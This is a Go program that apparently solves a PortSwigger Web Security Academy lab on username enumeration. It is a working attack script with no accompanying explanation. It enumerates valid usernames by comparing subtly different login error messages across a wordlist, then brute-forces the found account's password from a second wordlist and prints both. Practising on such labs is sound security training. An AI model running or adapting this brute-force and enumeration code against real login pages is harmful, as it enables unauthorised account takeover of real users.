// https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a8c004c037ba562c0b52bb600910052.web-security-academy.net"
	loginUrl := u + "/login"

	username, err := username(loginUrl, client)
	if err != nil {
		return err
	}

	password, err := password(loginUrl, username, client)
	if err != nil {
		return err
	}

	fmt.Println("Username:", username)
	fmt.Println("Password:", password)
	return nil
}

func username(u string, client *http.Client) (string, error) {
	f, err := os.Open("usernames.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	var prevMsg *string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		username := sc.Text()
		fmt.Println(username)

		_, _, msg, err := login(u, username, "123456", client)
		if err != nil {
			return "", err
		}
		if prevMsg != nil && *prevMsg != msg {
			return username, nil
		}
		prevMsg = &msg
	}
	return "", fmt.Errorf("username not found")
}

func password(u, username string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()
		fmt.Println(password)
		_, success, _, err := login(u, username, password, client)
		if err != nil {
			return "", err
		}
		if success {
			return password, nil
		}
	}
	return "", fmt.Errorf("password not found")
}

var msgRE *regexp.Regexp = regexp.MustCompile(`<p class=is-warning>([^<>]+)</p>`)

func login(u, username, password string, client *http.Client) (int, bool, string, error) {
	resp, err := client.PostForm(u, url.Values{"username": {username}, "password": {password}})
	if err != nil {
		return 0, false, "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
		return 0, false, "", fmt.Errorf("%v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, false, "", err
	}

	msg := msgRE.FindString(string(body))
	//fmt.Println("|", msg ,"|")
	success := strings.Contains(string(body), "Your username")
	return resp.StatusCode, success, msg, nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}
